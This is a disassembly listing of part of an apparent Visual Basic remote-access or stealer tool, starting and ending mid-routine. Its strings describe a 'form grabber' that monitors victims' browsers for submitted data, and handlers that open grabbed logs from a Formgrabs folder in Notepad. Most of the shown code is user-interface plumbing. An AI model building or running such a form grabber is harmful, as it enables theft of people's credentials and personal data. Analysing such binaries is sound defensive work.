008B94F1: lea eax, var_50
008B94F4: push eax
008B94F5: lea eax, var_4C
008B94F8: push eax
008B94F9: lea eax, var_48
008B94FC: push eax
008B94FD: lea eax, var_44
008B9500: push eax
008B9501: lea eax, var_40
008B9504: push eax
008B9505: lea eax, var_3C
008B9508: push eax
008B9509: lea eax, var_38
008B950C: push eax
008B950D: lea eax, var_34
008B9510: push eax
008B9511: lea eax, var_30
008B9514: push eax
008B9515: lea eax, var_2C
008B9518: push eax
008B9519: push 0000000Bh
008B951B: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B9520: add esp, 00000030h
008B9523: lea eax, var_00000084
008B9529: push eax
008B952A: lea eax, var_80
008B952D: push eax
008B952E: lea eax, var_7C
008B9531: push eax
008B9532: lea eax, var_78
008B9535: push eax
008B9536: lea eax, var_74
008B9539: push eax
008B953A: lea eax, var_70
008B953D: push eax
008B953E: lea eax, var_6C
008B9541: push eax
008B9542: lea eax, var_68
008B9545: push eax
008B9546: lea eax, var_64
008B9549: push eax
008B954A: lea eax, var_60
008B954D: push eax
008B954E: lea eax, var_5C
008B9551: push eax
008B9552: lea eax, var_58
008B9555: push eax
008B9556: push 0000000Ch
008B9558: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B955D: add esp, 00000034h
008B9560: lea eax, var_000000C4
008B9566: push eax
008B9567: lea eax, var_000000B4
008B956D: push eax
008B956E: lea eax, var_000000A4
008B9574: push eax
008B9575: lea eax, var_00000094
008B957B: push eax
008B957C: push 00000004h
008B957E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B9583: add esp, 00000014h
008B9586: lea eax, var_000000C8
008B958C: push eax
008B958D: push 00000000h
008B958F: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008B9594: ret 
End Sub

Private sub mnuHelp__8B82D9
008B82D9: push ebp
008B82DA: mov ebp, esp
008B82DC: sub esp, 0000000Ch
008B82DF: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B82E4: mov eax, fs:[00h]
008B82EA: push eax
008B82EB: mov fs:[00000000h], esp
008B82F2: mov eax, 00000080h
008B82F7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B82FC: push ebx
008B82FD: push esi
008B82FE: push edi
008B82FF: mov var_0C, esp
008B8302: mov var_08, 0040ED90h
008B8309: mov eax, [ebp+08h]
008B830C: and eax, 00000001h
008B830F: mov var_04, eax
008B8312: mov eax, [ebp+08h]
008B8315: and al, FEh
008B8317: mov [ebp+08h], eax
008B831A: mov eax, [ebp+08h]
008B831D: mov eax, [eax]
008B831F: push [ebp+08h]
008B8322: call [eax+04h]
008B8325: mov var_54, 80020004h
008B832C: mov var_5C, 0000000Ah
008B8333: mov var_44, 80020004h
008B833A: mov var_4C, 0000000Ah
008B8341: mov var_34, 80020004h
008B8348: mov var_3C, 0000000Ah
008B834F: push 0045A5BCh ; This feature will monitor your connection(s) web browser, and wait for them to submit interesting data.
008B8354: push 00441264h ; vbCrLf
008B8359: call 00410A18h ; &
008B835E: mov edx, eax
008B8360: lea ecx, var_18
008B8363: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B8368: push eax
008B8369: push 00441264h ; vbCrLf
008B836E: call 00410A18h ; &
008B8373: mov edx, eax
008B8375: lea ecx, var_1C
008B8378: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B837D: push eax
008B837E: push 0045A720h ; Technically, the form grabber will read data from all form types in their web browser, such as text fields, combo boxes, check boxes, etc.
008B8383: call 00410A18h ; &
008B8388: mov var_24, eax
008B838B: mov var_2C, 00000008h
008B8392: lea eax, var_5C
008B8395: push eax
008B8396: lea eax, var_4C
008B8399: push eax
008B839A: lea eax, var_3C
008B839D: push eax
008B839E: push 00000040h
008B83A0: lea eax, var_2C
008B83A3: push eax
008B83A4: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B83A9: lea eax, var_1C
008B83AC: push eax
008B83AD: lea eax, var_18
008B83B0: push eax
008B83B1: push 00000002h
008B83B3: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B83B8: add esp, 0000000Ch
008B83BB: lea eax, var_5C
008B83BE: push eax
008B83BF: lea eax, var_4C
008B83C2: push eax
008B83C3: lea eax, var_3C
008B83C6: push eax
008B83C7: lea eax, var_2C
008B83CA: push eax
008B83CB: push 00000004h
008B83CD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B83D2: add esp, 00000014h
008B83D5: mov var_04, 00000000h
008B83DC: push 008B8411h
008B83E1: jmp 8B8410h
008B83E3: lea eax, var_1C
008B83E6: push eax
008B83E7: lea eax, var_18
008B83EA: push eax
008B83EB: push 00000002h
008B83ED: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B83F2: add esp, 0000000Ch
008B83F5: lea eax, var_5C
008B83F8: push eax
008B83F9: lea eax, var_4C
008B83FC: push eax
008B83FD: lea eax, var_3C
008B8400: push eax
008B8401: lea eax, var_2C
008B8404: push eax
008B8405: push 00000004h
008B8407: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B840C: add esp, 00000014h
008B840F: ret 
End Sub

Private sub lstGrabs__8B37E6
008B37E6: push ebp
008B37E7: mov ebp, esp
008B37E9: sub esp, 0000000Ch
008B37EC: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B37F1: mov eax, fs:[00h]
008B37F7: push eax
008B37F8: mov fs:[00000000h], esp
008B37FF: push 00000008h
008B3801: pop eax
008B3802: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B3807: push ebx
008B3808: push esi
008B3809: push edi
008B380A: mov var_0C, esp
008B380D: mov var_08, 0040EB18h
008B3814: mov eax, [ebp+08h]
008B3817: and eax, 00000001h
008B381A: mov var_04, eax
008B381D: mov eax, [ebp+08h]
008B3820: and al, FEh
008B3822: mov [ebp+08h], eax
008B3825: mov eax, [ebp+08h]
008B3828: mov eax, [eax]
008B382A: push [ebp+08h]
008B382D: call [eax+04h]
008B3830: mov eax, [ebp+0Ch]
008B3833: or word ptr [eax], FFFFh
008B3837: mov var_04, 00000000h
008B383E: mov eax, [ebp+08h]
008B3841: mov eax, [eax]
008B3843: push [ebp+08h]
008B3846: call [eax+08h]
008B3849: mov eax, var_04
008B384C: mov ecx, var_14
008B384F: mov fs:[00000000h], ecx
008B3856: pop edi
008B3857: pop esi
008B3858: pop ebx
008B3859: leave 
008B385A: retn 0008h
End Sub

Private sub lstGrabs__8B41C6
008B41C6: push ebp
008B41C7: mov ebp, esp
008B41C9: sub esp, 00000018h
008B41CC: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B41D1: mov eax, fs:[00h]
008B41D7: push eax
008B41D8: mov fs:[00000000h], esp
008B41DF: mov eax, 0000031Ch
008B41E4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B41E9: push ebx
008B41EA: push esi
008B41EB: push edi
008B41EC: mov var_18, esp
008B41EF: mov var_14, 0040EB50h
008B41F6: mov eax, [ebp+08h]
008B41F9: and eax, 00000001h
008B41FC: mov var_10, eax
008B41FF: mov eax, [ebp+08h]
008B4202: and al, FEh
008B4204: mov [ebp+08h], eax
008B4207: mov var_0C, 00000000h
008B420E: mov eax, [ebp+08h]
008B4211: mov eax, [eax]
008B4213: push [ebp+08h]
008B4216: call [eax+04h]
008B4219: mov var_04, 00000001h
008B4220: mov var_04, 00000002h
008B4227: mov eax, [ebp+0Ch]
008B422A: cmp word ptr [eax], 000Dh
008B422E: jnz 008B49FBh
008B4234: mov var_04, 00000003h
008B423B: push FFFFFFFFh
008B423D: call 00410A60h ; On Error ...
008B4242: mov var_04, 00000004h
008B4249: push 00000020h
008B424B: lea eax, var_74
008B424E: push eax
008B424F: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
008B4254: cmp [008F529Ch], 00000000h
008B425B: jnz 8B4278h
008B425D: push 008F529Ch
008B4262: push 00440F2Ch
008B4267: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B426C: mov var_00000320, 008F529Ch
008B4276: jmp 8B4282h
008B4278: mov var_00000320, 008F529Ch
008B4282: mov eax, var_00000320
008B4288: mov eax, [eax]
008B428A: mov var_000002D8, eax
008B4290: lea eax, var_34
008B4293: push eax
008B4294: mov eax, var_000002D8
008B429A: mov eax, [eax]
008B429C: push var_000002D8
008B42A2: call [eax+14h]
008B42A5: fclex 
008B42A7: mov var_000002DC, eax
008B42AD: cmp var_000002DC, 00000000h
008B42B4: jnl 8B42D6h
008B42B6: push 00000014h
008B42B8: push 00440F1Ch
008B42BD: push var_000002D8
008B42C3: push var_000002DC
008B42C9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B42CE: mov var_00000324, eax
008B42D4: jmp 8B42DDh
008B42D6: and var_00000324, 00000000h
008B42DD: mov eax, var_34
008B42E0: mov var_000002E0, eax
008B42E6: lea eax, var_24
008B42E9: push eax
008B42EA: mov eax, var_000002E0
008B42F0: mov eax, [eax]
008B42F2: push var_000002E0
008B42F8: call [eax+50h]
008B42FB: fclex 
008B42FD: mov var_000002E4, eax
008B4303: cmp var_000002E4, 00000000h
008B430A: jnl 8B432Ch
008B430C: push 00000050h
008B430E: push 00440F3Ch
008B4313: push var_000002E0
008B4319: push var_000002E4
008B431F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B4324: mov var_00000328, eax
008B432A: jmp 8B4333h
008B432C: and var_00000328, 00000000h
008B4333: mov var_0000023C, 00000007h
008B433D: mov var_00000244, 00000003h
008B4347: push 004412DCh
008B434C: push 00000000h
008B434E: push 0000000Dh
008B4350: mov eax, [ebp+08h]
008B4353: mov eax, [eax]
008B4355: push [ebp+08h]
008B4358: call [eax+00000324h]
008B435E: push eax
008B435F: lea eax, var_38
008B4362: push eax
008B4363: call 00410A84h ; Set (object)
008B4368: push eax
008B4369: lea eax, var_000000C4
008B436F: push eax
008B4370: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B4375: add esp, 00000010h
008B4378: push eax
008B4379: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B437E: push eax
008B437F: lea eax, var_3C
008B4382: push eax
008B4383: call 00410A84h ; Set (object)
008B4388: mov var_000002E8, eax
008B438E: lea eax, var_28
008B4391: push eax
008B4392: mov eax, var_000002E8
008B4398: mov eax, [eax]
008B439A: push var_000002E8
008B43A0: call [eax+4Ch]
008B43A3: fclex 
008B43A5: mov var_000002EC, eax
008B43AB: cmp var_000002EC, 00000000h
008B43B2: jnl 8B43D4h
008B43B4: push 0000004Ch
008B43B6: push 004412DCh
008B43BB: push var_000002E8
008B43C1: push var_000002EC
008B43C7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B43CC: mov var_0000032C, eax
008B43D2: jmp 8B43DBh
008B43D4: and var_0000032C, 00000000h
008B43DB: mov eax, var_28
008B43DE: mov var_00000314, eax
008B43E4: and var_28, 00000000h
008B43E8: mov eax, var_00000314
008B43EE: mov var_000000DC, eax
008B43F4: mov var_000000E4, 00000008h
008B43FE: cmp [008F2010h], 00000000h
008B4405: jnz 8B4422h
008B4407: push 008F2010h
008B440C: push 00433984h
008B4411: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B4416: mov var_00000330, 008F2010h
008B4420: jmp 8B442Ch
008B4422: mov var_00000330, 008F2010h
008B442C: push 00000010h
008B442E: pop eax
008B442F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4434: lea esi, var_00000244
008B443A: mov edi, esp
008B443C: movsd 
008B443D: movsd 
008B443E: movsd 
008B443F: movsd 
008B4440: push 00000001h
008B4442: push 00000010h
008B4444: push 00440E58h
008B4449: push 00000010h
008B444B: pop eax
008B444C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4451: lea esi, var_000000E4
008B4457: mov edi, esp
008B4459: movsd 
008B445A: movsd 
008B445B: movsd 
008B445C: movsd 
008B445D: push 00000001h
008B445F: push 00000000h
008B4461: push 00440E48h
008B4466: push 00000000h
008B4468: push 00000018h
008B446A: mov eax, var_00000330
008B4470: mov eax, [eax]
008B4472: mov ecx, var_00000330
008B4478: mov ecx, [ecx]
008B447A: mov ecx, [ecx]
008B447C: push eax
008B447D: call [ecx+00000550h]
008B4483: push eax
008B4484: lea eax, var_40
008B4487: push eax
008B4488: call 00410A84h ; Set (object)
008B448D: push eax
008B448E: lea eax, var_000000D4
008B4494: push eax
008B4495: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B449A: add esp, 00000010h
008B449D: push eax
008B449E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B44A3: push eax
008B44A4: lea eax, var_44
008B44A7: push eax
008B44A8: call 00410A84h ; Set (object)
008B44AD: push eax
008B44AE: lea eax, var_000000F4
008B44B4: push eax
008B44B5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B44BA: add esp, 00000020h
008B44BD: push eax
008B44BE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B44C3: push eax
008B44C4: lea eax, var_48
008B44C7: push eax
008B44C8: call 00410A84h ; Set (object)
008B44CD: push eax
008B44CE: lea eax, var_00000104
008B44D4: push eax
008B44D5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B44DA: add esp, 00000020h
008B44DD: mov var_0000027C, 00000006h
008B44E7: mov var_00000284, 00000003h
008B44F1: push 004412DCh
008B44F6: push 00000000h
008B44F8: push 0000000Dh
008B44FA: mov eax, [ebp+08h]
008B44FD: mov eax, [eax]
008B44FF: push [ebp+08h]
008B4502: call [eax+00000324h]
008B4508: push eax
008B4509: lea eax, var_4C
008B450C: push eax
008B450D: call 00410A84h ; Set (object)
008B4512: push eax
008B4513: lea eax, var_00000144
008B4519: push eax
008B451A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B451F: add esp, 00000010h
008B4522: push eax
008B4523: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B4528: push eax
008B4529: lea eax, var_50
008B452C: push eax
008B452D: call 00410A84h ; Set (object)
008B4532: mov var_000002F0, eax
008B4538: lea eax, var_2C
008B453B: push eax
008B453C: mov eax, var_000002F0
008B4542: mov eax, [eax]
008B4544: push var_000002F0
008B454A: call [eax+4Ch]
008B454D: fclex 
008B454F: mov var_000002F4, eax
008B4555: cmp var_000002F4, 00000000h
008B455C: jnl 8B457Eh
008B455E: push 0000004Ch
008B4560: push 004412DCh
008B4565: push var_000002F0
008B456B: push var_000002F4
008B4571: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B4576: mov var_00000334, eax
008B457C: jmp 8B4585h
008B457E: and var_00000334, 00000000h
008B4585: mov eax, var_2C
008B4588: mov var_00000318, eax
008B458E: and var_2C, 00000000h
008B4592: mov eax, var_00000318
008B4598: mov var_0000015C, eax
008B459E: mov var_00000164, 00000008h
008B45A8: cmp [008F2010h], 00000000h
008B45AF: jnz 8B45CCh
008B45B1: push 008F2010h
008B45B6: push 00433984h
008B45BB: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B45C0: mov var_00000338, 008F2010h
008B45CA: jmp 8B45D6h
008B45CC: mov var_00000338, 008F2010h
008B45D6: push 00000010h
008B45D8: pop eax
008B45D9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B45DE: lea esi, var_00000284
008B45E4: mov edi, esp
008B45E6: movsd 
008B45E7: movsd 
008B45E8: movsd 
008B45E9: movsd 
008B45EA: push 00000001h
008B45EC: push 00000010h
008B45EE: push 00440E58h
008B45F3: push 00000010h
008B45F5: pop eax
008B45F6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B45FB: lea esi, var_00000164
008B4601: mov edi, esp
008B4603: movsd 
008B4604: movsd 
008B4605: movsd 
008B4606: movsd 
008B4607: push 00000001h
008B4609: push 00000000h
008B460B: push 00440E48h
008B4610: push 00000000h
008B4612: push 00000018h
008B4614: mov eax, var_00000338
008B461A: mov eax, [eax]
008B461C: mov ecx, var_00000338
008B4622: mov ecx, [ecx]
008B4624: mov ecx, [ecx]
008B4626: push eax
008B4627: call [ecx+00000550h]
008B462D: push eax
008B462E: lea eax, var_54
008B4631: push eax
008B4632: call 00410A84h ; Set (object)
008B4637: push eax
008B4638: lea eax, var_00000154
008B463E: push eax
008B463F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B4644: add esp, 00000010h
008B4647: push eax
008B4648: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B464D: push eax
008B464E: lea eax, var_58
008B4651: push eax
008B4652: call 00410A84h ; Set (object)
008B4657: push eax
008B4658: lea eax, var_00000174
008B465E: push eax
008B465F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B4664: add esp, 00000020h
008B4667: push eax
008B4668: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B466D: push eax
008B466E: lea eax, var_5C
008B4671: push eax
008B4672: call 00410A84h ; Set (object)
008B4677: push eax
008B4678: lea eax, var_00000184
008B467E: push eax
008B467F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B4684: add esp, 00000020h
008B4687: push 004412DCh
008B468C: push 00000000h
008B468E: push 0000000Dh
008B4690: mov eax, [ebp+08h]
008B4693: mov eax, [eax]
008B4695: push [ebp+08h]
008B4698: call [eax+00000324h]
008B469E: push eax
008B469F: lea eax, var_60
008B46A2: push eax
008B46A3: call 00410A84h ; Set (object)
008B46A8: push eax
008B46A9: lea eax, var_000001C4
008B46AF: push eax
008B46B0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B46B5: add esp, 00000010h
008B46B8: push eax
008B46B9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B46BE: push eax
008B46BF: lea eax, var_64
008B46C2: push eax
008B46C3: call 00410A84h ; Set (object)
008B46C8: mov var_000002F8, eax
008B46CE: lea eax, var_30
008B46D1: push eax
008B46D2: mov eax, var_000002F8
008B46D8: mov eax, [eax]
008B46DA: push var_000002F8
008B46E0: call [eax+4Ch]
008B46E3: fclex 
008B46E5: mov var_000002FC, eax
008B46EB: cmp var_000002FC, 00000000h
008B46F2: jnl 8B4714h
008B46F4: push 0000004Ch
008B46F6: push 004412DCh
008B46FB: push var_000002F8
008B4701: push var_000002FC
008B4707: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B470C: mov var_0000033C, eax
008B4712: jmp 8B471Bh
008B4714: and var_0000033C, 00000000h
008B471B: push var_30
008B471E: call 004109DCh ; Val(arg_1)
008B4723: fstp real8 ptr var_000002D4
008B4729: push 00000020h
008B472B: lea eax, var_000001F4
008B4731: push eax
008B4732: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
008B4737: mov var_0000020C, 0044BA20h ; notepad
008B4741: mov var_00000214, 00000008h
008B474B: mov eax, var_24
008B474E: mov var_0000031C, eax
008B4754: and var_24, 00000000h
008B4758: mov eax, var_0000031C
008B475E: mov var_0000008C, eax
008B4764: mov var_00000094, 00000008h
008B476E: mov var_0000021C, 0044A8C4h ; \Formgrabs\
008B4778: mov var_00000224, 00000008h
008B4782: lea eax, var_00000104
008B4788: push eax
008B4789: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B478E: mov var_0000010C, eax
008B4794: mov var_00000114, 00000008h
008B479E: mov var_0000025C, 004495B0h
008B47A8: mov var_00000264, 00000008h
008B47B2: lea eax, var_00000184
008B47B8: push eax
008B47B9: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B47BE: mov var_0000018C, eax
008B47C4: mov var_00000194, 00000008h
008B47CE: mov var_0000029C, 0044A82Ch
008B47D8: mov var_000002A4, 00000008h
008B47E2: fld real8 ptr var_000002D4
008B47E8: call 00410814h ; msvbvm60.dll.__vbaFpI4
008B47ED: push eax
008B47EE: push [008F2074h]
008B47F4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B47F9: mov eax, [eax]
008B47FB: mov var_000002AC, eax
008B4801: mov var_000002B4, 00000008h
008B480B: mov var_000002BC, 0044A834h ; .txt
008B4815: mov var_000002C4, 00000008h
008B481F: push 00000001h
008B4821: lea eax, var_00000214
008B4827: push eax
008B4828: lea eax, var_74
008B482B: push eax
008B482C: lea eax, var_00000084
008B4832: push eax
008B4833: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B4838: push eax
008B4839: lea eax, var_00000094
008B483F: push eax
008B4840: lea eax, var_000000A4
008B4846: push eax
008B4847: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B484C: push eax
008B484D: lea eax, var_00000224
008B4853: push eax
008B4854: lea eax, var_000000B4
008B485A: push eax
008B485B: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B4860: push eax
008B4861: lea eax, var_00000114
008B4867: push eax
008B4868: lea eax, var_00000124
008B486E: push eax
008B486F: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B4874: push eax
008B4875: lea eax, var_00000264
008B487B: push eax
008B487C: lea eax, var_00000134
008B4882: push eax
008B4883: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B4888: push eax
008B4889: lea eax, var_00000194
008B488F: push eax
008B4890: lea eax, var_000001A4
008B4896: push eax
008B4897: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B489C: push eax
008B489D: lea eax, var_000002A4
008B48A3: push eax
008B48A4: lea eax, var_000001B4
008B48AA: push eax
008B48AB: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B48B0: push eax
008B48B1: lea eax, var_000002B4
008B48B7: push eax
008B48B8: lea eax, var_000001D4
008B48BE: push eax
008B48BF: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B48C4: push eax
008B48C5: lea eax, var_000002C4
008B48CB: push eax
008B48CC: lea eax, var_000001E4
008B48D2: push eax
008B48D3: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B48D8: push eax
008B48D9: lea eax, var_000001F4
008B48DF: push eax
008B48E0: lea eax, var_00000204
008B48E6: push eax
008B48E7: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008B48EC: push eax
008B48ED: call 00410A96h ; Shell
008B48F2: fstp real8 ptr var_000002CC
008B48F8: lea ecx, var_30
008B48FB: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008B4900: lea eax, var_64
008B4903: push eax
008B4904: lea eax, var_60
008B4907: push eax
008B4908: lea eax, var_5C
008B490B: push eax
008B490C: lea eax, var_58
008B490F: push eax
008B4910: lea eax, var_54
008B4913: push eax
008B4914: lea eax, var_50
008B4917: push eax
008B4918: lea eax, var_4C
008B491B: push eax
008B491C: lea eax, var_48
008B491F: push eax
008B4920: lea eax, var_44
008B4923: push eax
008B4924: lea eax, var_40
008B4927: push eax
008B4928: lea eax, var_3C
008B492B: push eax
008B492C: lea eax, var_38
008B492F: push eax
008B4930: lea eax, var_34
008B4933: push eax
008B4934: push 0000000Dh
008B4936: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B493B: add esp, 00000038h
008B493E: lea eax, var_00000204
008B4944: push eax
008B4945: lea eax, var_000001F4
008B494B: push eax
008B494C: lea eax, var_000001E4
008B4952: push eax
008B4953: lea eax, var_000001D4
008B4959: push eax
008B495A: lea eax, var_000001B4
008B4960: push eax
008B4961: lea eax, var_000001C4
008B4967: push eax
008B4968: lea eax, var_000001A4
008B496E: push eax
008B496F: lea eax, var_00000194
008B4975: push eax
008B4976: lea eax, var_00000134
008B497C: push eax
008B497D: lea eax, var_00000184
008B4983: push eax
008B4984: lea eax, var_00000174
008B498A: push eax
008B498B: lea eax, var_00000164
008B4991: push eax
008B4992: lea eax, var_00000154
008B4998: push eax
008B4999: lea eax, var_00000144
008B499F: push eax
008B49A0: lea eax, var_00000124
008B49A6: push eax
008B49A7: lea eax, var_00000114
008B49AD: push eax
008B49AE: lea eax, var_000000B4
008B49B4: push eax
008B49B5: lea eax, var_00000104
008B49BB: push eax
008B49BC: lea eax, var_000000F4
008B49C2: push eax
008B49C3: lea eax, var_000000E4
008B49C9: push eax
008B49CA: lea eax, var_000000D4
008B49D0: push eax
008B49D1: lea eax, var_000000C4
008B49D7: push eax
008B49D8: lea eax, var_000000A4
008B49DE: push eax
008B49DF: lea eax, var_00000094
008B49E5: push eax
008B49E6: lea eax, var_00000084
008B49EC: push eax
008B49ED: lea eax, var_74
008B49F0: push eax
008B49F1: push 0000001Ah
008B49F3: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B49F8: add esp, 0000006Ch
008B49FB: mov var_10, 00000000h
008B4A02: wait 
008B4A03: push 008B4B24h
008B4A08: jmp 008B4B23h
008B4A0D: lea eax, var_30
008B4A10: push eax
008B4A11: lea eax, var_2C
008B4A14: push eax
008B4A15: lea eax, var_28
008B4A18: push eax
008B4A19: lea eax, var_24
008B4A1C: push eax
008B4A1D: push 00000004h
008B4A1F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B4A24: add esp, 00000014h
008B4A27: lea eax, var_64
008B4A2A: push eax
008B4A2B: lea eax, var_60
008B4A2E: push eax
008B4A2F: lea eax, var_5C
008B4A32: push eax
008B4A33: lea eax, var_58
008B4A36: push eax
008B4A37: lea eax, var_54
008B4A3A: push eax
008B4A3B: lea eax, var_50
008B4A3E: push eax
008B4A3F: lea eax, var_4C
008B4A42: push eax
008B4A43: lea eax, var_48
008B4A46: push eax
008B4A47: lea eax, var_44
008B4A4A: push eax
008B4A4B: lea eax, var_40
008B4A4E: push eax
008B4A4F: lea eax, var_3C
008B4A52: push eax
008B4A53: lea eax, var_38
008B4A56: push eax
008B4A57: lea eax, var_34
008B4A5A: push eax
008B4A5B: push 0000000Dh
008B4A5D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B4A62: add esp, 00000038h
008B4A65: lea eax, var_00000204
008B4A6B: push eax
008B4A6C: lea eax, var_000001F4
008B4A72: push eax
008B4A73: lea eax, var_000001E4
008B4A79: push eax
008B4A7A: lea eax, var_000001D4
008B4A80: push eax
008B4A81: lea eax, var_000001C4
008B4A87: push eax
008B4A88: lea eax, var_000001B4
008B4A8E: push eax
008B4A8F: lea eax, var_000001A4
008B4A95: push eax
008B4A96: lea eax, var_00000194
008B4A9C: push eax
008B4A9D: lea eax, var_00000184
008B4AA3: push eax
008B4AA4: lea eax, var_00000174
008B4AAA: push eax
008B4AAB: lea eax, var_00000164
008B4AB1: push eax
008B4AB2: lea eax, var_00000154
008B4AB8: push eax
008B4AB9: lea eax, var_00000144
008B4ABF: push eax
008B4AC0: lea eax, var_00000134
008B4AC6: push eax
008B4AC7: lea eax, var_00000124
008B4ACD: push eax
008B4ACE: lea eax, var_00000114
008B4AD4: push eax
008B4AD5: lea eax, var_00000104
008B4ADB: push eax
008B4ADC: lea eax, var_000000F4
008B4AE2: push eax
008B4AE3: lea eax, var_000000E4
008B4AE9: push eax
008B4AEA: lea eax, var_000000D4
008B4AF0: push eax
008B4AF1: lea eax, var_000000C4
008B4AF7: push eax
008B4AF8: lea eax, var_000000B4
008B4AFE: push eax
008B4AFF: lea eax, var_000000A4
008B4B05: push eax
008B4B06: lea eax, var_00000094
008B4B0C: push eax
008B4B0D: lea eax, var_00000084
008B4B13: push eax
008B4B14: lea eax, var_74
008B4B17: push eax
008B4B18: push 0000001Ah
008B4B1A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B4B1F: add esp, 0000006Ch
008B4B22: ret 
End Sub

Private sub lstGrabs__8B4B43
008B4B43: push ebp
008B4B44: mov ebp, esp
008B4B46: sub esp, 0000000Ch
008B4B49: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B4B4E: mov eax, fs:[00h]
008B4B54: push eax
008B4B55: mov fs:[00000000h], esp
008B4B5C: push 00000054h
008B4B5E: pop eax
008B4B5F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4B64: push ebx
008B4B65: push esi
008B4B66: push edi
008B4B67: mov var_0C, esp
008B4B6A: mov var_08, 0040EB88h
008B4B71: mov eax, [ebp+08h]
008B4B74: and eax, 00000001h
008B4B77: mov var_04, eax
008B4B7A: mov eax, [ebp+08h]
008B4B7D: and al, FEh
008B4B7F: mov [ebp+08h], eax
008B4B82: mov eax, [ebp+08h]
008B4B85: mov eax, [eax]
008B4B87: push [ebp+08h]
008B4B8A: call [eax+04h]
008B4B8D: mov eax, [ebp+0Ch]
008B4B90: cmp word ptr [eax], 0002h
008B4B94: jnz 008B4C6Eh
008B4B9A: mov var_50, 80020004h
008B4BA1: mov var_58, 0000000Ah
008B4BA8: mov var_40, 80020004h
008B4BAF: mov var_48, 0000000Ah
008B4BB6: mov var_30, 80020004h
008B4BBD: mov var_38, 0000000Ah
008B4BC4: mov var_20, 80020004h
008B4BCB: mov var_28, 0000000Ah
008B4BD2: push 00000010h
008B4BD4: pop eax
008B4BD5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4BDA: lea esi, var_58
008B4BDD: mov edi, esp
008B4BDF: movsd 
008B4BE0: movsd 
008B4BE1: movsd 
008B4BE2: movsd 
008B4BE3: push 00000010h
008B4BE5: pop eax
008B4BE6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4BEB: lea esi, var_48
008B4BEE: mov edi, esp
008B4BF0: movsd 
008B4BF1: movsd 
008B4BF2: movsd 
008B4BF3: movsd 
008B4BF4: push 00000010h
008B4BF6: pop eax
008B4BF7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4BFC: lea esi, var_38
008B4BFF: mov edi, esp
008B4C01: movsd 
008B4C02: movsd 
008B4C03: movsd 
008B4C04: movsd 
008B4C05: push 00000010h
008B4C07: pop eax
008B4C08: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B4C0D: lea esi, var_28
008B4C10: mov edi, esp
008B4C12: movsd 
